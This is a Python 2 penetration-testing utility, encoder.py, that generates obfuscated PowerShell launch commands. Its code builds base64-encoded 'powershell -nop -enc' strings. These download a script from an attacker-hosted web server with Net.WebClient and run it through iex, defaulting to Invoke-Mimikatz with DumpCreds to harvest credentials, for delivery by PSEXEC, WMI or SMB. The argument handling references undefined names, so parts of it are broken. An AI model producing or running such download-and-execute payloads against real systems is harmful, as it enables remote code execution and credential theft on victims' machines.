#!/usr/bin/env python

'''
Author: Christopher Duffy
Date: July 2015
Name: encoder.py
Purpose: To encode commands that execute PowerShell scripts, this library
has the necessary skeleton to have capabilities added as needed
Inputs:
src_ip - The IP of the host executing the attack
src_port - The port the host his hosting either the downloadable script or service
dst_ip - Target to hit (not needed at this time)
dst_port - Target port to hit (not needed at this time)
payload - The randomized payload name that needs to be passed to generate a correct command
function - The capabilty you are trying to us (e.g. Invoke-Mimikatz), included for randomization
argument - The action to execute (e.g. DumpCreds), included for randomization
execution - The pregenerated command you want to execute
Output: The encoded command that can be passed by PSEXEC, WMI, SMB or copy and paste
Copyright (c) 2015, Christopher Duffy & William Butler All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met: * Redistributions
of source code must retain the above copyright notice, this list of conditions and
the following disclaimer. * Redistributions in binary form must reproduce the above
copyright notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution. * Neither the
name of the nor the names of its contributors may be used to endorse or promote
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL CHRISTOPHER DUFFY & WILLIAM BUTLER BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'''

import base64, sys, argparse

try:
    import netifaces
except:
    sys.exit("[!] Install the netifaces library: pip install netifaces")

class Obfiscator:
    def __init__(self, src_ip, src_port, payload, function, argument, execution, dst_ip="", dst_port=""):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.src_port = src_port
        self.payload = payload
        self.function = function
        self.argument = argument
        self.execution = execution
        self.command = ""
        try:
            self.run()
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

    def run(self):
        if "invoker" in self.execution:
            # Direct invoker
            self.invoker()
        elif "download" in self.execution:
            # Direct downloader
            self.downloader()

    def packager(self, cleartext):
        encoded_utf = cleartext.encode('utf-16-le')
        encoded_base64 = base64.b64encode(encoded_utf)
        command = "powershell -nop -enc %s" % (encoded_base64)
        return(command)

    def invoker(self):
        # Invoke Mimikatz Directly
        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
        self.command = self.packager(text)

    def downloader(self):
        # Download String Directly
        # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload')
        text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s')" % (self.src_ip, self.src_port, self.payload)
        self.command = self.packager(text)

    def return_command(self):
        try:
            return(self.command)
        except Exception, e:
            print("[!] There was an error %s") % (str(e))
            sys.exit(1)

def get_interfaces():
    interfaces = netifaces.interfaces()
    return interfaces

def get_gateways():
    gateway_dict = {}
    gws = netifaces.gateways()
    for gw in gws:
        try:
            gateway_iface = gws[gw][netifaces.AF_INET]
            gateway_ip, iface = gateway_iface[0], gateway_iface[1]
            gw_list =[gateway_ip, iface]
            gateway_dict[gw]=gw_list
        except:
            pass
    return gateway_dict

def get_addresses(interface):
    addrs = netifaces.ifaddresses(interface)
    link_addr = addrs[netifaces.AF_LINK]
    iface_addrs = addrs[netifaces.AF_INET]
    iface_dict = iface_addrs[0]
    link_dict = link_addr[0]
    hwaddr = link_dict.get('addr')
    iface_addr = iface_dict.get('addr')
    iface_broadcast = iface_dict.get('broadcast')
    iface_netmask = iface_dict.get('netmask')
    return hwaddr, iface_addr, iface_broadcast, iface_netmask

def get_networks(gateways_dict):
    networks_dict = {}
    for key, value in gateways_dict.iteritems():
        gateway_ip, iface = value[0], value[1]
        hwaddress, addr, broadcast, netmask = get_addresses(iface)
        network = {'gateway': gateway_ip, 'hwaddr' : hwaddress, 'addr' : addr, 'broadcast' : broadcast, 'netmask' : netmask}
        networks_dict[iface] = network
    return networks_dict

def main():
    # If script is executed at the CLI
    usage = '''usage: %(prog)s [-t IP] [-r port] [-p payload.ps1] [-a argument] [-f function] [-i interface]  -q -v -vv -vvv'''
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-t", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
    parser.add_argument("-i", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
    parser.add_argument("-r", action="store", dest="src_port", default=None, help="Set the port the Mimikatz server is on, defaults to port 8000")
    parser.add_argument("-p", action="store", dest="payload", default=None, help="The name of the Mimikatz file")
    parser.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
    parser.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
    parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
    args = parser.parse_args()

    # Argument Validator
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if (args.payload == None) and (args.targets_file == None):
        parser.print_help()
        sys.exit(1)

    # Set Constructors
    verbose = args.verbose             # Verbosity level
    src_port = args.src_port           # Port to source the Mimikatz script on
    src_ip = args.src_ip               # IP to source the Mimikatz script on
    payload = args.payload             # The name of the payload that will be used
    interface = args.interface         # The interface to grab the IP from
    mim_func = args.mim_func           # The function that is executed
    mim_arg = args.mim_arg             # The argument processed by the function
    execution = "invoker"
    gateways = get_gateways()
    network_ifaces = get_networks(gateways)
    if src_ip == None:
        try:
           src_ip = network_ifaces[iface]
        except Exception as e:
            print("[!] No IP address found on interface eth0")

    x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
    print(x.return_command())
if __name__ == '__main__':
    main()
